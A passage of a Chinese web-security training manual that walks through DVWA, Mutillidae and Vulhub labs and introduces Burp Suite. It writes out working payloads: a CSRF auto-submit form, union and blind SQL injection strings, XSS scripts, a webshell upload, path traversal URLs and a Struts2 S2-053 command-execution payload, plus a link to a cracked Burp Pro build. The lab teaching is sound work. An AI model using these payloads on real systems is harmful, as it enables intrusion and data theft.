+<body onload="document.getElementById('transfer').submit()">        
+  <div>    
+    <form method="POST" id="transfer" action="http://192.168.153.130/dvwa/vulnerabilities/captcha/">     
+		<input type="hidden" name="password_new" value="password">
+		<input type="hidden" name="password_conf" value="password">     
+		<input type="hidden" name="step" value="2"      
+		<input type="hidden" name="Change" value="Change">        
+	</form>        
+  </div>        
+</body>
+</html>
+当受害者访问这个页面时，攻击脚本会伪造改密请求发送给服务器。
+ 
+美中不足的是，受害者会看到更改密码成功的界面（这是因为修改密码成功后，服务器会返回302，实现自动跳转），从而意识到自己遭到了攻击。
+ 
+SQL Injection
+SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一。近期很火的大使馆接连被黑事件，据说黑客依靠的就是常见的SQL注入漏洞。
+手工注入思路
+自动化的注入神器sqlmap固然好用，但还是要掌握一些手工注入的思路，下面简要介绍手工注入（非盲注）的步骤。
+1.判断是否存在注入，注入是字符型还是数字型
+2.猜解SQL查询语句中的字段数
+3.确定显示的字段顺序
+4.获取当前数据库
+5.获取数据库中的表
+6.获取表中的字段名
+7.下载数据
+下面将对Low级别的代码进行分析。
+服务器端核心代码
+<?php 
+
+if( isset( $_REQUEST[ 'Submit' ] ) ) { 
+    // Get input 
+    $id = $_REQUEST[ 'id' ]; 
+
+    // Check database 
+    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; 
+    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' ); 
+
+    // Get results 
+    $num = mysql_numrows( $result ); 
+    $i   = 0; 
+    while( $i < $num ) { 
+        // Get values 
+        $first = mysql_result( $result, $i, "first_name" ); 
+        $last  = mysql_result( $result, $i, "last_name" ); 
+
+        // Feedback for end user 
+        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>"; 
+
+        // Increase loop count 
+        $i++; 
+    } 
+
+    mysql_close(); 
+} 
+
+?> 
+可以看到，Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。
+漏洞利用
+现实攻击场景下，攻击者是无法看到后端代码的，所以下面的手工注入步骤是建立在无法看到源码的基础上。
+1.判断是否存在注入，注入是字符型还是数字型
+输入1，查询成功：
+ 
+输入1’and ‘1’ =’2，查询失败，返回结果为空：
+ 
+输入1’or ‘1234 ’=’1234，查询成功：
+ 
+返回了多个结果，说明存在字符型注入。
+2.猜解SQL查询语句中的字段数
+输入1′ or 1=1 order by 1 #，查询成功：
+ 
+输入1′ or 1=1 order by 2 #，查询成功：
+ 
+输入1′ or 1=1 order by 3 #，查询失败：
+ 
+说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。
+（这里也可以通过输入union select 1,2,3…来猜解字段数）
+3.确定显示的字段顺序
+输入1′ union select 1,2 #，查询成功：
+ 
+说明执行的SQL语句为select First name,Surname from 表 where ID=’id’…
+4.获取当前数据库
+输入1′ union select 1,database() #，查询成功：
+ 
+说明当前的数据库为dvwa。
+5.获取数据库中的表
+输入1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：
+ 
+说明数据库dvwa中一共有两个表，guestbook与users。
+6.获取表中的字段名
+输入1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #，查询成功：
+ 
+说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。
+7.下载数据
+输入1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：
+ 
+这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。
+SQL Injection(Blind)
+SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。
+手工盲注思路
+手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。
+盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注，这里由于实验环境的限制，只演示基于布尔的盲注与基于时间的盲注。
+下面简要介绍手工盲注的步骤（可与之前的手工注入作比较）：
+1.判断是否存在注入，注入是字符型还是数字型
+2.猜解当前数据库名
+3.猜解数据库中的表名
+4.猜解表中的字段名
+5.猜解数据
+下面将对Low级别的代码进行分析。
+服务器端核心代码
+<?php 
+
+if( isset( $_GET[ 'Submit' ] ) ) { 
+    // Get input 
+    $id = $_GET[ 'id' ]; 
+
+    // Check database 
+    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; 
+    $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors 
+
+    // Get results 
+    $num = @mysql_numrows( $result ); // The '@' character suppresses errors 
+    if( $num > 0 ) { 
+        // Feedback for end user 
+        echo '<pre>User ID exists in the database.</pre>'; 
+    } 
+    else { 
+        // User wasn't found, so the page wasn't! 
+        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); 
+
+        // Feedback for end user 
+        echo '<pre>User ID is MISSING from the database.</pre>'; 
+    } 
+
+    mysql_close(); 
+} 
+
+?> 
+可以看到，Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种，‘
+User ID exists in the database.
+‘与‘
+`User ID is MISSING from the database.`
+‘，因此这里是SQL盲注漏洞。
+漏洞利用
+首先演示基于布尔的盲注：
+1.判断是否存在注入，注入是字符型还是数字型
+输入1，显示相应用户存在：
+ 
+输入1’ and 1=1 #，显示存在：
+ 
+输入1’ and 1=2 #，显示不存在：
+ 
+说明存在字符型的SQL盲注。
+2.猜解当前数据库名
+想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。
+输入1’ and length(database())=1 #，显示不存在；
+输入1’ and length(database())=2 #，显示不存在；
+输入1’ and length(database())=3 #，显示不存在；
+输入1’ and length(database())=4 #，显示存在：
+说明数据库名长度为4。
+下面采用二分法猜解数据库名。
+输入1’ and ascii(substr(databse(),1,1))>97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；
+输入1’ and ascii(substr(databse(),1,1))<122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；
+输入1’ and ascii(substr(databse(),1,1))<109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；
+输入1’ and ascii(substr(databse(),1,1))<103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；
+输入1’ and ascii(substr(databse(),1,1))<100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；
+输入1’ and ascii(substr(databse(),1,1))>100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。
+…
+重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。
+3.猜解数据库中的表名
+首先猜解数据库中表的数量：
+1’ and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在
+1’ and (select count (table_name) from information_schema.tables where table_schema=database() )=2 # 显示存在
+说明数据库中共有两个表。
+接着挨个猜解表名：
+1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在
+1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在
+…
+1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在
+说明第一个表名长度为9。
+1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97 # 显示存在
+1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<122 # 显示存在
+1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<109 # 显示存在
+1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<103 # 显示不存在
+1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>103 # 显示不存在
+说明第一个表的名字的第一个字符为小写字母g。
+…
+重复上述步骤，即可猜解出两个表名（guestbook、users）。
+4.猜解表中的字段名
+首先猜解表中字段的数量：
+1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 # 显示不存在
+…
+1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # 显示存在
+说明users表有8个字段。
+接着挨个猜解字段名：
+1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在
+…
+1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 # 显示存在
+说明users表的第一个字段为7个字符长度。
+采用二分法，即可猜解出所有字段名。
+5.猜解数据
+同样采用二分法。
+还可以使用基于时间的盲注：
+1.判断是否存在注入，注入是字符型还是数字型
+输入1’ and sleep(5) #，感觉到明显延迟；
+输入1 and sleep(5) #，没有延迟；
+说明存在字符型的基于时间的盲注。
+2.猜解当前数据库名
+首先猜解数据名的长度：
+1’ and if(length(database())=1,sleep(5),1) # 没有延迟
+1’ and if(length(database())=2,sleep(5),1) # 没有延迟
+1’ and if(length(database())=3,sleep(5),1) # 没有延迟
+1’ and if(length(database())=4,sleep(5),1) # 明显延迟
+说明数据库名长度为4个字符。
+接着采用二分法猜解数据库名：
+1’ and if(ascii(substr(database(),1,1))>97,sleep(5),1)# 明显延迟
+…
+1’ and if(ascii(substr(database(),1,1))<100,sleep(5),1)# 没有延迟
+1’ and if(ascii(substr(database(),1,1))>100,sleep(5),1)# 没有延迟
+说明数据库名的第一个字符为小写字母d。
+…
+重复上述步骤，即可猜解出数据库名。
+3.猜解数据库中的表名
+首先猜解数据库中表的数量：
+1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟
+1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟
+说明数据库中有两个表。
+接着挨个猜解表名：
+1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟
+…
+1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟
+说明第一个表名的长度为9个字符。
+采用二分法即可猜解出表名。
+4.猜解表中的字段名
+首先猜解表中字段的数量：
+1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟
+…
+1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟
+说明users表中有8个字段。
+接着挨个猜解字段名：
+1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟
+…
+1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟
+说明users表的第一个字段长度为7个字符。
+采用二分法即可猜解出各个字段名。
+5.猜解数据
+同样采用二分法。
+XSS
+XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。
+DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。
+（注：下面的实验都是在Firefox浏览器下进行的，感谢火狐没做XSS filter）
+反射型XSS
+下面将对Low级别的代码进行分析。
+服务器端核心代码
+<?php 
+// Is there any input? 
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
+    // Feedback for end user 
+    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>'; 
+} 
+?>
+可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。
+漏洞利用 
+输入<script>alert(/xss/)</script>，成功弹框：
+ 
+相应的XSS链接：
+http://192.168.153.130/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(/xss/)%3C%2Fscript%3E#
+存储型XSS
+下面将对Low级别的代码进行分析。
+服务器端核心代码
+<?php 
+if( isset( $_POST[ 'btnSign' ] ) ) { 
+    // Get input 
+    $message = trim( $_POST[ 'mtxMessage' ] ); 
+    $name    = trim( $_POST[ 'txtName' ] ); 
+    // Sanitize message input 
+    $message = stripslashes( $message ); 
+    $message = mysql_real_escape_string( $message ); 
+    // Sanitize name input 
+    $name = mysql_real_escape_string( $name ); 
+    // Update database 
+    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; 
+    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' ); 
+    //mysql_close(); 
+} 
+?>
+相关函数介绍
+trim(string,charlist)
+函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。
+mysql_real_escape_string(string,connection)
+函数会对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。
+stripslashes(string)
+函数删除字符串中的反斜杠。
+可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。
+漏洞利用 
+message一栏输入<script>alert(/xss/)</script>，成功弹框：
+ 
+name一栏前端有字数限制，抓包改为<script>alert(/name/)</script>：
+ 
+成功弹框：
+ 
+File Upload
+File Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。
+ 
+下面将对Low级别的代码进行分析。
+服务器端核心代码
+<?php 
+
+if( isset( $_POST[ 'Upload' ] ) ) { 
+    // Where are we going to be writing to? 
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; 
+    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 
+
+    // Can we move the file to the upload folder? 
+    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { 
+        // No 
+        echo '<pre>Your image was not uploaded.</pre>'; 
+    } 
+    else { 
+        // Yes! 
+        echo "<pre>{$target_path} succesfully uploaded!</pre>"; 
+    } 
+} 
+
+?> 
+basename(path,suffix) 
+
+函数返回路径中的文件名部分，如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。
+可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。
+漏洞利用
+文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知。不幸的是，这里三个条件全都满足。
+上传文件hack.php（一句话木马）
+ 
+上传成功，并且返回了上传路径
+ 
+打开中国菜刀，右键添加，
+地址栏填入上传文件所在路径http://192.168.153.130/dvwa/hackable/uploads/hack.php，
+参数名（一句话木马口令）为apple。
+ 
+然后菜刀就会通过向服务器发送包含apple参数的post请求，在服务器上执行任意命令，获取webshell权限。
+可以下载、修改服务器的所有文件。
+File Inclusion
+File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。
+ 
+下面将对Low级别的代码进行分析。
+服务器端核心代码
+<php
+//Thepagewewishtodisplay
+$file=$_GET['page'];
+>
+可以看到，服务器端对page参数没有做任何的过滤跟检查。
+服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。
+ 
+点击file1.php后，显示如下
+ 
+而现实中，恶意的攻击者是不会乖乖点击这些链接的，因此page参数是不可控的。
+漏洞利用
+1.本地文件包含
+构造url
+http://192.168.153.130/dvwa/vulnerabilities/fi/page=/etc/shadow
+ 
+报错，显示没有这个文件，说明不是服务器系统不是Linux，但同时暴露了服务器文件的绝对路径C:\xampp\htdocs。
+构造url（绝对路径）
+http://192.168.153.130/dvwa/vulnerabilities/fi/page=C:\xampp\htdocs\dvwa\php.ini
+成功读取了服务器的php.ini文件
+ 
+构造url（相对路径）
+http://192.168.153.130/dvwa/vulnerabilities/fi/page=..\..\..\..\..\..\..\..\..\xampp\htdocs\dvwa\php.ini
+加这么多..\是为了保证到达服务器的C盘根目录，可以看到读取是成功的。
+
+ 
+可以打开服务器的虚拟终端。
+  
+3.1.2	 OWASP Mutillidae
+OWASP（Open Web Application Security Project）是一个开源的、非盈利性的全球性安全组织。由全球的会员共同推动安全标准、安全测试工具、安全指导手册等应用安全技术的发展。OWASP也有中国的官方网站（http://www.owasp.org.cn/）, 在这里可以关注到OWASP在中国的培训与活动等相关信息。 
+OWASP Mutillidae 是一个开源的、免费的漏洞演习系统，其是专门为OWASP提出的Top 10漏洞制作了题集，能够在系统中设置防范的等级，以及提示的详细程度等等，里面也有丰富的资料和视频链接可供学习。Mutillidae可以在Windows和Linux中进行安装。
+3.1.2.1	3.1.2.1 Mutillidae的安装
+Windows平台上的安装：
+在windows下的安装类似于DVWA，依赖httpd、PHP、MySQL、php-mysql等应用或组件，可以基于xammp这个软件进行使用。
+1、	下载mutillidae的安装文件
+下载地址：https://sourceforge.net/projects/mutillidae/
+ 
+2、下载好安装包后解压到D:\xampp\htdocs\目录下,这里xampp是安装在D盘根目录下的
+3、编辑D:\xampp\htdocs\mutillidae目录下.htaccess的文件，修改允许访问的IP地址范围，默认只允许127.和localhost以及192.168.0.0/16的地址访问
+默认配置：
+## This allows access from localhost
+Allow from 127.
+Allow from localhost
+
+## This is to allow access from other machines on Virtual Box host-only networks.
+Allow from 192.168.0.0/16
+可修改为：
+## This is to allow access from other machines on Virtual Box host-only networks.
+Allow from 192.168.0.0/16
+Allow from 10.0.0.0/8    #你所使用的本地的测试网络
+4、mutillidae默认连接mysql的数据库用户名时root，密码为空，如果xammp的mysql的用户名和密码没有修改的话，就可以直接登陆，若是xammp的mysql的root账户的密码修改过，比如改成了root，则下需要在mutillidae的D:\xampp\htdocs\mutillidae\classes目录下的MySQLHandler.php文件中修改数据库的登陆密码
+static public $mMySQLDatabasePassword = "root";
+5、然后就可以直接在浏览器中输入http://127.0.0.1/mutillidae/访问mutilledae的漏洞平台了
+ 
+
+Linux平台上的安装：
+当然也可以根据自己的情况把mutillidae安装在LINUX系统上，由于mutillidae也想dvwa一样依赖apache，php和mysql，因此需要在准备linux的环境时注意，下面介绍在ubuntu系统上搭建mutillidae的方法。
+1）安装apache服务器和相关组件：
+sudo apt-get install apache2 apache2-utils
+2）修改对应的配置文件
+#Modify file /etc/apache2/mods-enabled/dir.conf
+sudo vi /etc/apache2/mods-enabled/dir.conf
+<IfModule mod_dir.c>
+      DirectoryIndex index.php index.html index.cgi index.pl index.xhtml index.htm
+</IfModule>
+
+3）安装mysql数据库，密码可以默认为空，也可给root用户设置密码
+sudo apt-get install mysql-server libapache2-mod-auth-mysql php5-mysql
+sudo mysql_install_db
+4）安装php组件
+sudo apt-get install php5 php5-mysql php-pear php5-gd  php5-mcrypt php5-curl libapache2-mod-php5
+
+5）可以验证下php组件是否正常工作
+新建个php文件：sudo vi /var/www/html/phpinfo.php
+在文件中添加信息：<?php phpinfo(); ?>
+然后在浏览器中访问下： http://localhost/phpinfo.php
+正常情况下能显示php的信息页面
+6）下载Mutillidae的项目文件放到/var/www/html/路径下（apache服务器默认提供的web服务的路径）
+可以直接git
+cd /var/www/html/
+sudo git clone git://git.code.sf.net/p/mutillidae/git mutillidae
+也可以到网站上下载zip的压缩包解压到对应的路径下
+下载网站：
+7）使用mutillidae：
+直接在浏览器中访问如下地址即可打开mutillidae漏洞平台
+http://localhost/html/mutillidae
+说明：
+首次打开使用mutillidae时可能会遇到数据库密码不对的情况，需要确保mutillidae配置中使用的数据库账号和密码与之前安装的mysql时设置的账户密码一致：
+修改mutillidae的数据库密码配置的方法如下：
+sudo vi /var/www/html/mutillidae/classes/MySQLHandler.php
+更改"$mMySQLDatabasePassword"的值;
+3.1.2.2	3.1.2.2 使用介绍：
+1、	使用浏览器访问http://yourip/mutillidae/ 
+ 
+2、	在顶部的菜单栏中可以进行安全等级的切换（默认level为0，非常不安全），漏洞提示切换（默认漏洞提示开关时使能的）
+3、	在页面的左边菜单栏包含时mutillidae收录的一些漏洞分类，主要是owasp收录的17年，13年，10年排名前10的漏洞类型等
+4、	选择其中一项具体的漏洞打开页面，如下图操作：
+ 
+5、	可以看到每个页面上包含Hints and Videos，这部分就是提示每个页面上包含的所有漏洞信息，点开可以看到对应漏洞的信息和利用方法，以及漏洞利用指导的视屏链接信息
+ 
+6、	接下来就可以参照漏洞提示文档中描述的信息和方法进行漏洞的利用了。
+3.1.2.3	3.1.2.3 举个例子：
+1）	在浏览器中打开http://10.180.184.30/mutillidae/index.php?page=register.php注册1个用户，test1，密码password，signature信息填写test1 is a admin
+2）	然后重新在浏览器中打开http://10.180.184.30/mutillidae/index.php?page=user-info.php页面
+3）	在name输入框中输入test1‘ or ‘1’=’1信息，不用填密码，直接点击查看账户信息
+ 
+4）	就可以直接查出test1的用户信息，包括密码
+ 
+3.1.3	 Vulhub
+Vulhub是一款使用Docker-compose进行漏洞测试/环境一键搭建的项目。它是面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。
+Vulhub项目是基于docker容器搭建的，可以根据需要自行编译每个漏洞项目，也可以直接去下载别人已经编译好的漏洞项目。下面介绍下介于docker自行编译漏洞项目。
+3.1.3.1	3.1.3.1 环境安装
+在ubuntu16.04下安装docker/docker-compose:
+# 安装pip
+curl -s https://bootstrap.pypa.io/get-pip.py | python3
+
+# 安装最新版docker
+curl -s https://get.docker.com/ | sh
+
+# 启动docker服务
+service docker start
+
+# 安装compose
+pip install docker-compose 
+其他操作系统安装docker和docker-compose可能会有些许不同，请阅读Docker文档进行安装。
+3.1.3.2	3.1.3.2 Vulhub使用
+1）拉取项目到本地
+git clone git@github.com:phith0n/vulhub.git
+cd vulhub
+2） 进入某一个漏洞/环境的目录
+cd nginx_php5_mysql
+3） 自动化编译环境
+docker-compose build
+4） 启动整个环境
+docker-compose up -d
+每个漏洞环境目录下都有相应的说明文件，介绍这个漏洞的信息和利用的方法，可以参考该说明文件进行漏洞/环境测试。
+5）测试完成后，删除整个环境
+docker-compose down
+
+3.1.3.3	3.1.3.3举个例子：
+我们来搭建bulhub项目中struct2 s-053远程代码执行漏洞
+1）进入到漏洞的目录下
+root@ubuntu:/mnt/myspace#cd vulhub-master/struts2/s2-053/
+root@ubuntu:/mnt/myspace/vulhub-master/struts2/s2-053# ls
+01.png  docker-compose.yml  README.md
+2）可以看到目录下包含一个README.md文档，该文档介绍了改漏洞的环境编译，漏洞存在的原因和如何利用信息，如下：
+# S2-053 远程代码执行漏洞
+影响版本: Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12
+漏洞详情:
+ - http://struts.apache.org/docs/s2-053.html
+ - https://mp.weixin.qq.com/s?__biz=MzU0NTI4MDQwMQ==&mid=2247483663&idx=1&sn=6304e1469f23c33728ab5c73692b675e
+## 测试环境搭建
+```
+docker-compose up -d
+```
+环境运行后，访问`http://your-ip:8080/hello.action`即可看到一个提交页面。
+## 漏洞复现
+Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。
+输入如下Payload即可成功执行命令：
+```
+%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
+
+```
+
+3）参照该文档分别使用命令启动环境（有些漏洞项目需要编译，具体参照各漏洞的文档说明）
+docker-compose up –d 命令启动环境
+4）漏洞利用
+在浏览器中输入如下地址：
+Your ip：8080/hello.action
+ 
+在输入框中提交如下信息即可远程执行命令（执行的命令如红色标识的部分）
+%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
+
+输出执行的结果：当前的用户为root
+ 
+3.2	Burp Suite
+3.2.1	概述
+Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，所有的工具可以共享一个HTTP 消息。其多种功能可以帮我们执行各种任务，比如请求的拦截和修改,扫描web应用程序漏洞,以暴力破解登陆表单,执行会话令牌等多种的随机性检查，除此之外，他还能与其它工具拓展使用。
+Burpsuite主窗口界面如下 
+主要包括以下模块
+Target——显示目标目录结构的的一个功能
+Proxy——是一个拦截HTTP/S的代 理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流
+Spider——是一个应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能
+Scanner——是一个高级的工具，执行后，它能自动地发现web 应用程序的安全漏洞
+Intruder——是一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞
+Repeater——一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具
+Sequencer——是一个用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具
+Decoder——是一个进行手动执行或对应用程序数据者智能解码编码的工具
+Comparer——是一个实用的工具，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”
+Extender——可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能
+Options(设置)——对Burp Suite的一些设置
+
+安装
+Burp Suite是一个无需安装软件，下载完成后，直接双击打开即可。但Burp Suite是用Java语言开发的，运行时依赖于JRE，需要提前安装Java环境。安装完Java环境之后，首先验证Java配置是否正确，如果输入java -version 出现下图的结果，证明配置正确且已完成。
+  
+Burp免费版下载地址：https://portswigger.net/burp/freedownload/，
+专业破解版下载地址：ftp://10.180.187.2/%B9%A4%BE%DF/burpsuite_pro_v1.7.11
+
+工作流程
+Proxy（代理工具）可以说是Burp Suite测试流程的一个心脏，它可以通过浏览器浏览应用程序来捕获所有相关信息，这个过程将填充代理的历史（http history）和站点地图（site map）所有请求的内容。在站点地图中也可以显示未经请求的站点(灰色显示，通过spider被动爬行)。然后可以将http history或者site map中的http 请求或响应，发送到scanner进行漏洞分析，发送到repeater来手动攻击，发送到intruder来构造自定义的攻击，发送到sequencer测试应用程序的session tokens。
+ 
+
+
+代理配置
+1.4.1浏览器配置代理
+工具>>Internet选项>>连接>>局域网>>勾选代理服务器填写地址127.0.0.1端口8080，这里端口可以随便定义但是要跟burp的监听端口要一致。
+ 
+1.4.2 Burpsuite配置代理
+在proxy>>options中添加proxy listener
+ 
+
+3.2.2	Proxy工具
+Burp Proxy相当于BurpSuite的心脏，可以拦截，查看和修改浏览器与目标Web服务器请求和响应消息，支持http和https。
+Burp 代理允许你通过监视和操纵应用程序传输的关键参数和其他数据来查找和探索应用程序的漏洞。通过恶意的方式修改浏览器的请求，Burp代理可以用来进行攻击，如：SQL 注入，cookie 欺骗，会话劫持，目录遍历，缓冲区溢出。拦截的传输可以被修改成原始文本，也可以是包含参数或者消息头的表格，也可以十六进制形式，甚至可以操纵二进制形式的数据。除了每一个请求，Burp 代理保持着一个完整的历史记录，包括浏览器发送的每一个请求，所有的操作，以及接收到的所有响应。你可以复查较早的请求，并修改后补发任何请求，还能以原始的形式或者 web 页面的形式来查看保存的响应。可以把两个方向上的整个会话记录到一个文件中，用来作进一步分析或者提供审查线索。
+Proxy包含四个4个选项卡，intercept、http history、websockets history和options。
+Intercept
